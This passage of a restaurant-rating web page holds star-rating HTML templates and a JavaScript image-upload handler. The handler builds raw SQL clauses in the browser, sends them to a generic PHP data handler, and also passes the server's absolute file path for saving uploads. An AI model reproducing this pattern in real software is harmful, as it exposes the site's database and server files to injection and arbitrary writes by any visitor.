            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 3:
                            return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 4:
                            return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 5: return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 6: return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 7: return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 8: return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 9: return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        default:
                            break
                    }
                }
                async function handleFiles(files) {
                    let postJson={}
                    const preview=document.getElementById("preview")

                    let formData = new FormData();
                    formData.append("userId", userId);
                    formData.append("placeId", placeId);

                    for (let i = 0; i < files.length; i++) {
                        const file = files[i];
                        if (!file.type.startsWith('image/')){ continue }
                        const idx=(file.name).indexOf('.')
                        const fileName=`${userId}-${placeId}.${(file.name).substring(idx+1)}`
                        const filePath=`/var/www/html/config/recordImages/${fileName}`

                        let postJson={}
                        postJson[0]=2
                        postJson[1]='*'
                        postJson[2]='record'
                        postJson[3]=`userid=${userId} and \`where\`=${placeId}`
                        const v=JSON.parse(await $.post( "script/php/DAOHandler.php",postJson))

                        if(v.length>0) {
                            let postJson={}
                            postJson[0]=3
                            postJson[1]='record'
                            postJson[2]=`image='http://ssossotable.com/config/recordImages/${fileName}'`
                            postJson[3]=`userid=${userId} and \`where\`=${placeId}`
                            await $.post( "script/php/DAOHandler.php",postJson)
                        }
                        else {
                            postJson={}
                            postJson[0]=1
                            postJson[1]="record(userid,`where`,image)"
                            postJson[2]=`${userId},${placeId},'http://ssossotable.com/config/recordImages/${fileName}'`
                            await $.post( "script/php/DAOHandler.php",postJson)
                        }

                        formData.append("filePath", filePath);
                        formData.append("image", file);

                        await $.ajax({
                            type:"POST",
                            url: "/script/php/FileHandler.php",
                            processData: false,
                            contentType: false,
                            data: formData
                        })


                        const img = document.createElement("img");
                        img.classList.add("obj");
                        img.file = file;

                        img.width=60
                        img.height=60

                        preview.innerHTML=``
                        preview.appendChild(img); // "preview"가 결과를 보여줄 div 출력이라 가정.

                        const reader = new FileReader();
                        reader.onload = (function(aImg) { return function(e) { aImg.src = e.target.result; }; })(img);
                        reader.readAsDataURL(file);
                    }
                }
            </script>
            <ul class="list-group list-group-flush">

                <li class="list-group-item">
                    <input type="text" id="where" placeholder="where?" autocomplete='off'>
                </li>
            </ul>
            <div class="card-body">
                <input type="button" value="검색" class="btn text-white" style="background-color:#e4bd74; color:white;" onclick="search();">
            </div>
            <div class="card-body" id="search-result">
                <ul class="list-group" id="search-result-list" style="max-height: 200px; overflow-y: auto;">
                </ul>
            </div>
        </div>
    </main>

    <footer class="mastfoot mt-auto">
        <div class="inner">
            <p>Created by<a href="http://ssossotable.com"> ssosso.table</a>, by <a href="http://ssossotable.com">@ssosso.table</a></p>
        </div>
    </footer>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</body></html>